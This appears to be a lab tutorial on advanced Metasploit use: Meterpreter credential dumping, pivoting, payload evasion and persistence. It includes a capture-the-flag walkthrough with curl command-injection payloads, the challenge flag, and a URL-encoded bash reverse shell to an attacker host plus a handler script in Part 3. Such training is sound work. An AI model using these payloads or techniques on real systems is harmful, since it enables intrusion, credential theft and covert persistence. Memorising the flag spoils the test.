Introduction

Advanced Metasploit concepts overview

Welcome to the Advanced Metasploit Deep Dive! This lab covers post-exploitation with Meterpreter, pivoting & port forwarding, evasion techniques (encoders, packers, custom templates), persistence mechanisms, and resource script automation. The practical challenge uses command injection with multi-stage exploitation.

Part 1 — Key Advanced Concepts

What you need to know before the practical

  • 1 Meterpreter. After exploitation, use migrate for stability, getsystem for privilege escalation, hashdump for credential extraction, and load kiwi for Mimikatz capabilities.
  • 2 Post Modules. Use post/multi/recon/local_exploit_suggester to find escalation paths, and persistence modules like post/linux/manage/sshkey_persistence for maintained access.
  • 3 Pivoting. Use autoroute to add network routes through compromised hosts, portfwd for direct port tunneling, and auxiliary/server/socks_proxy with proxychains for full network pivoting.
  • 4 Evasion. Use msfvenom with the -e x86/shikata_ga_nai encoder and -i for multiple encoding iterations. Use -x to embed payloads in legitimate executables and -k to keep the template functional.
  • 5 Resource Scripts. Create .rc files with Metasploit commands for automation. Use makerc to record sessions. Set global variables with setg to persist across modules.

Part 2 — Practical Exploitation

Multi-stage exploitation chain via curl

  • Step 1 Start Containers. Click "Launch Target Server" and "Start Kali Container". Note the Target IP and connect to Kali using docker exec -it [id] bash.
  • Step 2 Reconnaissance. Enumerate the target — discover the running user and OS:
    curl http://<TARGET_IP>/ curl "http://<TARGET_IP>/api/diagnostics?cmd=id" curl "http://<TARGET_IP>/api/diagnostics?cmd=uname%20-a"
  • Step 3 Enumerate Files. Explore the file system to locate the flag:
    curl "http://<TARGET_IP>/api/diagnostics?cmd=ls%20/" curl "http://<TARGET_IP>/api/diagnostics?cmd=ls%20/etc/"
  • Step 4 Exploit with Command Chaining. Use a URL-encoded semicolon (%3B) to chain commands and exfiltrate the flag:
    curl "http://<TARGET_IP>/api/diagnostics?cmd=id%3Bcat%20/etc/flag"
  • Step 5 Claim Flag. The server will execute both commands, returning the flag in the JSON response: FLAG{MSF_D33P_D1V3_M4ST3R}.

Part 3 — Advanced Techniques Reference

Techniques for real-world engagements

  • Tip 1 Reverse Shell. After confirming command injection, establish a persistent interactive shell:
    Listener: nc -lvnp 9999 Injection: cmd=id%3Bbash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/9999%200>%261'
  • Tip 2 Multi/Handler Automation. Create a resource script to automate listener setup:
    use exploit/multi/handler set PAYLOAD linux/x86/meterpreter/reverse_tcp set LHOST 0.0.0.0 set LPORT 4444 set ExitOnSession false exploit -j
    Save as handler.rc and run with msfconsole -r handler.rc.
  • Tip 3 Post-Exploitation. Once you have a Meterpreter session, immediately migrate to a stable process, run getsystem for privileges, then use post/multi/recon/local_exploit_suggester to find additional escalation paths.
